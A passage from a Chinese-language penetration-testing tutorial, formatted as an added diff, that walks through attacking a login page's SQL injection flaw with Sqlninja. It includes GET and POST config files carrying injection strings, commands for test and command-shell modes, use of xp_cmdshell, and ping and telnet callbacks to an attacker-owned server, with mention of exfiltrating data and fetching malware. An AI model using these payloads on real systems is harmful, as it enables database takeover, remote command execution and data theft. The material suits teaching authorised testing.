@@ -1,0 +1,103 @@
+
+在 Sqlninja 中，你需要使用 `__SQL2INJECT__` 命令定义要注入的易受攻击变量。这与 SQLmap 不同，在 SQLmap 中我们不需要指定要测试的字段。让我们通过几个例子来了解，这会让事情更加清晰。在使用 Sqlninja 之前，我们需要定义 SQL 配置文件。该文件将包含关于 URL、HTTP 方法类型、会话 Cookie 和浏览器代理的所有信息。
+
+让我向你展示获取 Sqlninja 所需信息的最简单方法。和之前一样，启动 Burp Suite 并在传递易受攻击字段的请求上开启代理拦截。在下面的例子中，我们将捕获发送到 `/wfLogin.aspx` 的请求并识别 POST 参数值。这将包含 Sqlninja 注入所需的大部分信息，但需要根据 Burp 原始请求进行细微修改。
+
+让我们看看 Burp 中识别出潜在 SQLi 漏洞的请求之一。
+
+![](images/00067.jpeg)
+
+Figure 34 - Burp Request Example
+
+在接下来的两个例子中，你将看到如何创建最常见的 GET 和 POST 参数。这可用于任何不同类型的 HTTP 方法，但通常会使用 POST 和 GET 方法。
+
+从原始 Burp 请求与其在 Sqlninja 配置文件中的录入方式对比，有几点需要注意：
+
+*   HTTP 方法（GET/POST）需要修改为包含完整 URL。Burp 请求中 `/wfLogin.aspx` 前面缺少 `http://site.com`。
+*   你必须通过添加 `__SQL2INJECT__` 字符串来定义要模糊测试的参数。
+*   有时为了 Sqlninja 攻击，你可能需要先尝试关闭易受攻击的 SQL 参数。这可以通过单引号、双引号或分号来完成。
+
+### GET Parameter Example
+
+我们将把包含两个易受攻击参数的 `sql_get.conf` 配置文件写入 Kali 桌面。Sqlninja 将尝试攻击 `user` 和 `pass` 字段，并尝试验证它们是否易受攻击。要在终端中创建/修改配置文件，请输入：
+
+*   `gedit ~/Desktop/sql_get.conf`
+*   将以下内容输入配置文件并保存：
+
+```
+—httprequest_start—
+GET http://site.com/wfLogin.aspx?user=test’;__SQL2INJECT__&pass=test’;__SQL2INJECT__HTTP/1.0
+Host: site.com
+User-Agent: Mozilla/5.0 (X11; U; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8
+Accept: text/xml, application/xml, text/html; q=0.9, text/plain; q=0.8, image/png,*/*
+Accept-Language: en-us, en; q=0.7, it;q=0.3
+Accept-Charset: ISO-8859-15, utf-8; q=0.7,*;q=0.7
+Content-Type: application/x-www-form-urlencoded
+Cookie: ASPSESSIONID=3dkDjb3jasfwefJGd
+Connection: close
+—httprequest_end—
+```
+
+### POST Parameter Example
+
+POST 请求与 GET 请求的区别在于参数是在数据部分传递，而不是作为 URL 的一部分。在终端中我们需要创建配置文件并修改要注入的参数。在本例中，我们将注入 `username` 和 `password` 两个字段：
+
+*   `gedit ~/Desktop/sql_post.conf`
+*   将以下内容输入配置文件并保存：
+
+```
+—httprequest_start—
+POST http://site.com/wflogin.aspx HTTP/1.0
+Host: site.com
+User-Agent: Mozilla/5.0 (X11; U; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8
+Accept: text/xml, application/xml, text/html; q=0.9, text/plain; q=0.8, image/png, */*
+Accept-Language: en-us, en; q=0.7, it;q=0.3
+Accept-Charset: ISO-8859-15, utf-8; q=0.7,*;q=0.7
+Content-Type: application/x-www-form-urlencoded
+Cookie: ASPSESSIONID=3dkDjb3jasfwefJGd
+Connection: close
+username=test’;__SQL2INJECT__&password=test’;__SQL2INJECT__
+—httprequest_end—
+```
+
+### Executing Sqlninja
+
+无论你使用 GET 还是 POST 方法攻击，执行攻击的命令都是相同的。现在我们已经创建了配置文件，可以使用以下命令运行 Sqlninja：
+
+*   `sqlninja -mt -f sql_get.conf`
+
+以下命令表示使用测试模式运行 Sqlninja，查看注入是否适用于我们刚创建的配置文件。如果你幸运地发现了一个有效的 SQL 注入，就可以开始攻击数据库。在下面的例子中，我们将利用数据库，查找版本，检查我们是否为拥有管理权限的 "sa" 账户，并查看是否有 Shell 访问权限。
+
+![](images/00068.jpeg)
+
+Figure 35 - Sqlninja Example
+
+一旦 `xp_cmdshell` 可用，我们想要测试是否拥有命令行访问权限以及拥有什么类型的权限。在下面的例子中，我们正在利用 SQLi 漏洞并测试命令行命令。
+
+在这个特定测试中（如下图），看起来我们可能正在服务器上运行命令，但我们需要验证这一点。问题在于，在我们拥有的互联网服务器上设置监听器后，似乎没有看到来自受损服务器的出站连接。如果我们想要窃取数据回传或下载额外的恶意软件，这可能是个问题。由于 Sqlninja 创建的命令行控制台不显示命令的响应，我们确实需要验证我们的命令是否成功执行。
+
+检查命令是否工作的最好方法是在我们公开拥有的外部服务器上使用 `tcpdump` 监听 ping。通过在受损服务器上运行 ping 命令，我们可以轻松验证我们的服务器是否响应 ping。使用 ping 的原因是 ICMP 通常允许出站，且不太可能触发 IDS/IPS 签名。这可以通过攻击者拥有的外部服务器上的以下命令配置：
+
+*   `tcpdump -nnvXSs 0 -c2 icmp`
+
+该命令将记录发送到我服务器的任何 ping，我将能够验证服务器可以向外通信且我的命令正在工作。在我受损的 SQLi 主机上，我执行一个简单的 ping 回我的服务器。如果成功，`tcpdump` 将看到 ICMP 请求。
+
+命令行 SQLi 攻击可以通过以下命令运行：
+
+*   `sqlninja -f [configuration_file] -m c`
+
+正如下图所示，我首先尝试运行 telnet 命令回连我的服务器，但不成功。然后我尝试发起 ping 命令回我的服务器，此时 `tcpdump` 正在监听。在这种情况下，我的攻击成功了，这证明我可以在该主机上运行完整命令，但它没有向外的 Web 访问权限。
+
+在下图中，顶部是我的服务器记录 ping，底部图像是易受 SQLi 攻击的受害主机。尽管 telnet 命令似乎失败了，但 ping 是成功的。
+
+![](images/00069.jpeg)
+
+Figure 36 - SQLMap Command Injection Ping
+
+如果你已经走到这一步但不确定下一步该做什么，可以跳转到 Lateral Pass Section 了解后续步骤。这应该能给你足够的细节帮助你开始在易受攻击的框架上测试和练习。当然，这些是最佳场景选项，即 SQLi 无需配置关于数据库类型、盲注类型或其他时序问题的详细设置即可生效。
+
+![](images/00070.jpeg)
+
+我不能在不谈论跨站脚本（XSS）的情况下谈论 Web 应用程序漏洞。这可能是我发现的最常见的漏洞之一。正如我们所知，XSS 是由应用程序缺乏输入验证引起的用户攻击。有两种类型的 XSS：反射型和存储型，它们允许攻击者将脚本代码写入用户的浏览器。我将重点关注反射型 XSS，因为它是最常见的，而且在很大程度上，利用该漏洞的方法相对相似。
+
+BeEF Exploitation Framework (http://beefproject.com/) (Kali Linux)
